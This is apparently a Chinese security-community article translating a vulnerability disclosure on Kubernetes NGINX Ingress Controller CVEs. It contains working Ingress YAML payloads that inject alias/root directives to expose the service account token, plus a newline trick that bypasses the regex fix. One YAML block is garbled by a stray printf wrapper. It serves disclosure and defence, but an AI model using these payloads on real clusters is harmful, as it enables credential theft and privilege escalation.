#  Kubernetes NGINX Ingress Controller 中的新漏洞   
TeamsSix  火线Zone   2022-07-08 18:00  
  
最新漏洞，原文地址：https://blog.lightspin.io/kubernetes-nginx-ingress-controller-vulnerabilities  
  
**序**  
  
**言**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/svTZwicpRoAzKXVbAdRXsbs2hXzMlVuaURn600GLXRkzfPqU8UHh24XluTm81DwXS15nd7ciahKru8mrbKlFguWA/640?wx_fmt=png "")  
  
  
  
从 2021 年 10 月开始，NGINX 的 Kubernetes Ingress Controller开始受到安全研究人员的关注。  
  
曾披露了CVE-2021-25742漏洞(https://github.com/kubernetes/ingress-nginx/issues/7837)：攻击者可以通过定制化的Snippets特性创建或修改集群中的Ingress实例，从而获取集群中所有的Secret实例信息。  
  
CVE-2021-25742 的要点是：攻击者能够使用片段注释功能将 Lua 代码作为 NGINX 配置的一部分注入服务器块中。由于当时 NGINX Kubernetes Ingress Controller 的设计不安全，攻击者可以利用 Lua 代码执行来获取 Ingress Controller 访问令牌（该令牌在 Kubernetes 集群内具有高权限）。  
  
**研**  
  
**究**  
  
**历**  
  
**程**  
  
在 CVE-2021-25742 发布后的几个月内，Lightspin 和其他研究人员发现了三个利用 NGINX Kubernetes Ingress Controller 配置文件注入的新 CVE：CVE-2021-25745、CVE-2021-25746、CVE-2021 -25748：  
  
(CVE-2021-25745)  
  
https://github.com/kubernetes/ingress-nginx/issues/8502  
  
(CVE-2021-25746)  
  
https://github.com/kubernetes/ingress-nginx/issues/8503  
  
(CVE-2021 -25748)  
  
https://github.com/kubernetes/ingress-nginx/issues/8686  
  
  
**探**  
  
**讨**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/svTZwicpRoAzKXVbAdRXsbs2hXzMlVuaURn600GLXRkzfPqU8UHh24XluTm81DwXS15nd7ciahKru8mrbKlFguWA/640?wx_fmt=png "")  
  
  
  
**1、Kubernetes NGINX Ingress Controller 漏洞频发的原因**  
  
  
Ingress Controller 之所以成为攻击者和研究人员的理想目标，主要有三个原因。  
- 流行：根据公开研究，大多数 Kubernetes 集群使用 NGINX 作为其入口控制器。以下是CNCF 2021 年针对使用过的 Kubernetes Ingress 提供商的调查结果。NGINX 的 Ingress Controller 用于全球 50% 的响应集群。  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFqibahd201P3U1iat0yVKicHdMTeA2Cia1qwrr23xhhjiaIkaTiaEiab4RPt0Q/640?wx_fmt=jpeg "")  
  
  
- 高权限：默认情况下，NGINX Ingress Controller在集群中拥有一个具有强大权限的服务帐户，例如能够获取集群中的任何密钥。如果 Kubernetes 集群中有一个服务帐户绑定到另一个高特权集群角色（例如“cluster-admin”），攻击者可以轻松地从 NGINX Ingress Controller转移到另一个服务帐户。  
  
- 开源：在过去的几年里，软件供应链风险一直是安全社区的头等大事，就 NGINX Ingress Controller而言，它的流行应该会加剧这种担忧。  
  
  
  
  
**根本原因**  
  
  
作为 Ingress-NGINX 实现的一部分，有两个主要组件在运行：  
- NGINX Web 代理服务器：接收传入请求并根据nginx.conf配置文件中编写的规则路由它们。  
  
- Ingress controller: 负责通过将其解释添加到nginx.conf配置文件来满足 Ingress 资源规则的组件。  
  
在安全设计中，应该有一种方式从 Ingress 控制器访问 NGINX Web 代理nginx.conf配置文件以进行规则更新。NGINX Web 代理进程不应该对 Ingress 控制器资源有任何访问权限。  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFuuHjiaZ6rLrEuXbDm8Ry9GS9UTlAHvY9wSqjcIjib3OibibPsXqLksQyDg/640?wx_fmt=jpeg "")  
  
  
添加到 Ingress 控制器的ingress-nginx集群角色使这种分离更加重要，这将决定它在集群中正确运行。此集群角色具有强大的权限，例如获取集群范围内的所有密钥。不幸的是，这种分离还没有完全实现，这使得 Ingress-NGINX 成为在集群内进行提权的较好途径。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFqZ9ulxiaZA7KAeWKUKZibUzVCUBec1iasmNR928bAgFxMicoPukMGyGeqQ/640?wx_fmt=jpeg "")  
  
  
**2、CVE-2021-25745：使用Ingress资源注入nginx.conf**  
  
  
该过程的一个重要部分是了解 Ingress 资源定义如何转换为nginx.conf文件中的配置块。首先，创建一个简单的 Ingress 资源。  
  
  
```
printf("hello worlapiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
name: gaf-ingress
annotations:
kubernetes.io/ingress.class: "nginx"
spec:
rules:
- http:
paths:
- path: /gaf
pathType: Prefix
backend:
service:
name: some-service
port:
number: 5678d!");
```  
  
  
  
创建 Ingress 资源后，我们可以检查nginx.conf文件中的更改。  
  
  
```
kubectl exec -it <ingress-nginx-controller-pod> -n ingress-nginx -- cat /etc/nginx/nginx.conf | grep gaf -A 20 -B 20
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFcB8uYAtMFgR3uQicsrdglqhmBESpGNF81NuyKImDjpd4CLY3MK5LC0A/640?wx_fmt=jpeg "")  
  
  
有多个字段的值被注入到nginx.conf文件中（path, namespace, Ingress name, service name and port)。但它们中的大多数被 DNS 使用，并且仅限于字母数字字符、数字、“-”或“.”。唯一可以包含任何字符的字段是路径。  
  
通过操作路径字段中的值，我们可以关闭配置中的当前位置块，并打开一个新块，可以包含任意我们想输入的内容，即“配置注入”。由于 NGINX 有可以提供静态内容的指令，我们可以使用指令或 Lua 代码来获取ingress-nginx服务帐户令牌。  
  
**alias指令的payload：**  
  
```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
name: gaf-ingress
annotations:
kubernetes.io/ingress.class: "nginx"
spec:
rules:
- http:
paths:
- path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
pathType: Prefix
backend:
service:
name: some-service
port:
number: 5678
```  
  
  
  
**root指令的payload：**  
  
```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
name: gaf-ingress
annotations:
kubernetes.io/ingress.class: "nginx"
spec:
rules:
- http:
paths:
- path: /serviceaccount{root /var/run/secrets/kubernetes.io;}location ~* ^/aaa
pathType: Prefix
backend:
service:
name: some-service
port:
number: 5678
```  
  
  
  
这是使用alias指令payload后生成的 nginx.conf 内容：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjF8oWRia50ExS8MHSichZUbHict2T2pcKsLNV9ZAz8IhkXnAhB4IMPd7Gag/640?wx_fmt=jpeg "")  
  
  
现在我们可以从  http:///gaf/token访问 Ingress 控制器服务帐户令牌。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFYCttNibH6I4Kmm8VOHvLZQmonwOia6FZ3gPu8m0kBibCSgiaxorNfgEmiaQ/640?wx_fmt=jpeg "")  
  
  
**3、CVE-2021-25748：修复和绕过**  
  
  
作为 CVE-2021-25745 修复的一部分，Kubernetes 团队为 Ingress 对象规范实施了深度检查（ https://github.com/kubernetes/ingress-nginx/pull/8456/commits/83107e0af40b99066b6a72faf33d95a969d17b18 ）。  
  
  
该检查器使用正则表达式模式列表来验证 Ingress 字段的值，如下所示。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSSoJzx1XUPCogV9YuoLtjFia5SzgsichNgU1bWdMuias82kVm2wuBysvZiaRnKs34go728Wd1fE0khfw/640?wx_fmt=jpeg "")  
  
  
虽然整体实现实现了其目标，但我们仍然发现上述正则表达式模式存在两个问题：  
  
- / var/run链接到/run。所以，我们可以访问/run/secrets/kubernetes.io/serviceaccount/token  
  
- 我们可以使用换行符 (\n) 绕过 '.*;' 查看。  
  
这是一个绕过正则表达式payload示例，正如我们所解释的：  
  
  
```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
name: gaf-ingress
annotations:
kubernetes.io/ingress.class: "nginx"
spec:
rules:
- http:
paths:
- path: "/gaf{alias #\n/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa"
pathType: Prefix
backend:
service:
name: some-service
port:
number: 5678
```  
  
  
  
上述情况已经报告给了Kubernetes，随后在 NGINX Ingress Controller 的 1.2.1 版本中得到修复。作为更新修复的一部分， alias 和 root 指令已被删除，这使我们滥用正则表达式模式的方式无效。  
  
  
  
  
  
**【火线Zone云安全社区群】**  
  
进群可以与技术大佬互相交流  
  
进群有机会免费领取节假日礼品  
  
进群可以免费观看技术分享直播  
  
识别二维码回复**【社区群】**进群  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwGQLM4tsY4nTvLyBeGWOtv4GficOaAWl9lhop3l4o7zahn4ib4R5YsW7QQ/640?wx_fmt=jpeg "")  
  
  
**【相关精选文章】**  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495928&idx=1&sn=b2381664e3cec1742d50b0afae61ea2d&chksm=eaa978d8dddef1ce2882fddb453c00e7e777c9922f36d6b26745dad08ed384baf423855f1a21&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495894&idx=1&sn=bfe228cd674fd5b9b7a208578e579652&chksm=eaa978f6dddef1e0a33a0d4fd3ddae36722123c81c3ba71c439bc5d78ef5f272a090e44d4d22&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwGicdWbB2xBTFib0XzJO1ertfuF3jocicHB88Zxn0cfhATzCLHicKju6EaLw/640?wx_fmt=png "")  
  
火线Zone是[火线安全平台]运营的云安全社区，内容涵盖云计算、云安全、漏洞分析、攻防等热门主题，研究讨论云安全相关技术，助力所有云上用户实现全面的安全防护。欢迎具备分享和探索精神的云上用户加入火线Zone社区，共建一个云安全优质社区！  
  
如需转载火线Zone公众号内的文章请联系火线小助手：hxanquan（微信）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaTf5R6lHvwO5WVsDRNyynwG1OK03VUOHaicOibhdUZUxesnic7VYym0AxpYHDHMVghddk29FTUzjbFAw/640?wx_fmt=jpeg "")  
  
//  火线Zone  
   
//  
  
微信号 : huoxian_zone  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CkzQxaHZX9KdW919vwagVwhCeicQPXuMGibHcf2WqiaFyvfy5p1oIk1C5SOdtTyLlQmOtEia7FMKicknJzGTmYLWb2Q/640?wx_fmt=gif "")  
  
点击阅读原文，加入社区，共建一个有技术氛围的优质社区！  
